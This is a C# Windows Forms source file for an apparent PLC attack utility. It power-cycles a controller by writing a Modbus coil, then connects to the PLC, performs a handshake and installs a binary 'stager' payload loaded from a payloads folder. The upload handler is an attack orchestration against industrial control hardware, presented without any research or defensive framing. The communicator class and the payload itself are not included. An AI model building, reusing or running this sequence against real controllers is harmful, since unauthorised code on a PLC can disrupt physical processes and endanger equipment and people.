using System;
using System.Windows.Forms;
using System.Net.Sockets;
using Modbus.Device;
using System.Threading.Tasks;
using System.IO;

namespace S7_Csharp_Utility
{
    public partial class MainForm : Form
    {
        private readonly PlcCommunicator _plc;

        public MainForm()
        {
            InitializeComponent();
            _plc = new PlcCommunicator(Log);
        }

        private async void powerOnButton_Click(object sender, EventArgs e)
        {
            await SetPower(true);
        }

        private async void powerOffButton_Click(object sender, EventArgs e)
        {
            await SetPower(false);
        }

        private async Task SetPower(bool on)
        {
            string state = on ? "ON" : "OFF";
            Log($"Attempting to turn power {state}...");

            try
            {
                string host = modbusHostTextBox.Text;
                if (!int.TryParse(modbusPortTextBox.Text, out int port))
                {
                    Log("Error: Invalid Modbus port.");
                    return;
                }
                if (!ushort.TryParse(modbusCoilTextBox.Text, out ushort coilAddress))
                {
                    Log("Error: Invalid Modbus coil address.");
                    return;
                }

                using (var client = new TcpClient())
                {
                    await client.ConnectAsync(host, port);
                    if (!client.Connected)
                    {
                        Log($"Error: Could not connect to Modbus host {host}:{port}.");
                        return;
                    }

                    var factory = new Modbus.Utility.ModbusFactory();
                    IModbusMaster master = factory.CreateMaster(client);

                    // The coil address in NModbus is 0-based.
                    // Assuming user input is 1-based, so subtract 1.
                    ushort zeroBasedCoilAddress = (ushort)(coilAddress - 1);

                    await master.WriteSingleCoilAsync(0, zeroBasedCoilAddress, on);
                    Log($"Successfully turned power {state}.");
                }
            }
            catch (Exception ex)
            {
                Log($"Error controlling power: {ex.Message}");
            }
        }

        private void Log(string message)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => Log(message)));
                return;
            }
            logTextBox.AppendText($"[{DateTime.Now:HH:mm:ss}] {message}{Environment.NewLine}");
            logTextBox.ScrollToCaret();
        }

        private async void uploadStagerButton_Click(object sender, EventArgs e)
        {
            SetControlsEnabled(false);
            try
            {
                // Power cycle the device
                await SetPower(false);
                int delaySeconds = (int)delayNumericUpDown.Value;
                Log($"Waiting for {delaySeconds} seconds before powering on...");
                await Task.Delay(delaySeconds * 1000);
                await SetPower(true);

                // Give the PLC a moment to be ready for the handshake
                await Task.Delay(50);

                await RunFullSequenceAsync();
            }
            catch (Exception ex)
            {
                Log($"An error occurred during the sequence: {ex.Message}");
            }
            finally
            {
                if (_plc.IsConnected)
                {
                    _plc.Disconnect();
                }
                SetControlsEnabled(true);
            }
        }

        private async Task RunFullSequenceAsync()
        {
            if (!int.TryParse(plcPortTextBox.Text, out int port))
            {
                Log("Error: Invalid PLC port.");
                return;
            }
            await _plc.ConnectAsync(plcHostTextBox.Text, port);
            if (!_plc.IsConnected) return;

            if (await _plc.PerformHandshakeAsync())
            {
                await _plc.GetVersion();

                string stagerPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "payloads", "stager", "stager.bin");
                if (!File.Exists(stagerPath))
                {
                    Log($"Error: Stager payload not found at {stagerPath}");
                    return;
                }
                byte[] stagerPayload = await File.ReadAllBytesAsync(stagerPath);
                Log($"Loaded stager payload ({stagerPayload.Length} bytes).");

                await _plc.InstallStager(stagerPayload);
            }
        }

        private void SetControlsEnabled(bool enabled)
        {
            plcSettingsBox.Enabled = enabled;
            modbusSettingsBox.Enabled = enabled;
            powerOnButton.Enabled = enabled;
            powerOffButton.Enabled = enabled;
            uploadStagerButton.Enabled = enabled;
        }
    }
}
